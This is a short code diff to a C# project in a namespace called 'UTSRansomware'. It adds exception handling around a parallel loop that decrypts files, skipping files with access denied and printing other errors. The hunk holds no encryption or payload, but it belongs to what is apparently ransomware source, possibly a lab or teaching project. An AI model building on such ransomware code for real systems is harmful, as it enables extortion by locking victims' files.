@@ -59,8 +59,21 @@ namespace UTSRansomware
             }
             Parallel.ForEach(filePaths, (filePath) =>
             {
-                DecryptFile(filePath);
-            });
+                try
+                {
+                    DecryptFile(filePath);
+                }
+
+                catch (UnauthorizedAccessException)
+                {
+                Console.WriteLine($"Access denied to: {filePath}. Skipping...");
+                }
+
+                catch (Exception ex)
+                {
+                Console.WriteLine(ex.ToString());
+                }
+        });
         }
 
         // Decrypts a given file
